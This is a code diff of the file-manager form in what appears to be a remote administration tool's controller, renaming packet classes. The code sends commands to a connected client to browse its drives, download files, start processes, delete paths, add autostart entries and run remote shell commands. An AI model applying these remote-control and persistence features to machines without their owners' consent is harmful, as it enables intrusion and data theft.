@@ -32,7 +32,7 @@ namespace xServer.Forms
             if (_connectClient != null)
             {
                 this.Text = Helper.GetWindowTitle("File Manager", _connectClient);
-                new Core.Packets.ServerPackets.Drives().Execute(_connectClient);
+                new Core.Packets.ServerPackets.GetDrives().Execute(_connectClient);
             }
         }
 
@@ -51,7 +51,7 @@ namespace xServer.Forms
                     if (_connectClient.Value.LastDirectorySeen)
                     {
                         _currentDir = cmbDrives.Items[cmbDrives.SelectedIndex].ToString();
-                        new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                        new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
                         _connectClient.Value.LastDirectorySeen = false;
                     }
                 }
@@ -77,7 +77,7 @@ namespace xServer.Forms
                             if (!_currentDir.EndsWith(@"\"))
                                 _currentDir = _currentDir + @"\";
 
-                            new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                            new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
                             _connectClient.Value.LastDirectorySeen = false;
                         }
                         else
@@ -89,7 +89,7 @@ namespace xServer.Forms
                                 else
                                     _currentDir += @"\" + lstDirectory.SelectedItems[0].SubItems[0].Text;
 
-                                new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                                new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
                                 _connectClient.Value.LastDirectorySeen = false;
                             }
                         }
@@ -114,7 +114,7 @@ namespace xServer.Forms
 
                     if (_connectClient != null)
                     {
-                        new Core.Packets.ServerPackets.DownloadFile(path, ID).Execute(_connectClient);
+                        new Core.Packets.ServerPackets.DoDownloadFile(path, ID).Execute(_connectClient);
 
                         this.Invoke((MethodInvoker) delegate
                         {
@@ -140,7 +140,7 @@ namespace xServer.Forms
                         path += @"\" + files.SubItems[0].Text;
 
                     if (_connectClient != null)
-                        new Core.Packets.ServerPackets.StartProcess(path).Execute(_connectClient);
+                        new Core.Packets.ServerPackets.DoProcessStart(path).Execute(_connectClient);
                 }
             }
         }
@@ -168,7 +168,7 @@ namespace xServer.Forms
                             newName = _currentDir + @"\" + newName;
 
                         if (_connectClient != null)
-                            new Core.Packets.ServerPackets.Rename(path, newName, isDir).Execute(_connectClient);
+                            new Core.Packets.ServerPackets.DoPathRename(path, newName, isDir).Execute(_connectClient);
                     }
                 }
             }
@@ -194,7 +194,7 @@ namespace xServer.Forms
                         DialogResult.Yes)
                     {
                         if (_connectClient != null)
-                            new Core.Packets.ServerPackets.Delete(path, isDir).Execute(_connectClient);
+                            new Core.Packets.ServerPackets.DoPathDelete(path, isDir).Execute(_connectClient);
                     }
                 }
             }
@@ -217,7 +217,7 @@ namespace xServer.Forms
                         if (frm.ShowDialog() == DialogResult.OK)
                         {
                             if (_connectClient != null)
-                                new Core.Packets.ServerPackets.AddStartupItem(AutostartItem.Name, AutostartItem.Path,
+                                new Core.Packets.ServerPackets.DoStartupItemAdd(AutostartItem.Name, AutostartItem.Path,
                                     AutostartItem.Type).Execute(_connectClient);
                         }
                     }
@@ -229,7 +229,7 @@ namespace xServer.Forms
         {
             if (_connectClient != null)
             {
-                new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
                 _connectClient.Value.LastDirectorySeen = false;
             }
         }
@@ -253,14 +253,14 @@ namespace xServer.Forms
 
                 if (_connectClient.Value.FrmRs != null)
                 {
-                    new Core.Packets.ServerPackets.ShellCommand(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
+                    new Core.Packets.ServerPackets.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
                     _connectClient.Value.FrmRs.Focus();
                 }
                 else
                 {
                     FrmRemoteShell frmRS = new FrmRemoteShell(_connectClient);
                     frmRS.Show();
-                    new Core.Packets.ServerPackets.ShellCommand(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
+                    new Core.Packets.ServerPackets.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(_connectClient);
                 }
             }
         }
@@ -282,7 +282,7 @@ namespace xServer.Forms
                 if (!CommandHandler.CanceledDownloads.ContainsKey(transfer.Index))
                     CommandHandler.CanceledDownloads.Add(int.Parse(transfer.Text), "canceled");
                 if (_connectClient != null)
-                    new Core.Packets.ServerPackets.DownloadFileCanceled(int.Parse(transfer.Text)).Execute(_connectClient);
+                    new Core.Packets.ServerPackets.DoDownloadFileCancel(int.Parse(transfer.Text)).Execute(_connectClient);
                 var id = int.Parse(transfer.SubItems[0].Text);
                 CommandHandler.RenamedFiles.Remove(id);
                 UpdateTransferStatus(transfer.Index, "Canceled", 0);
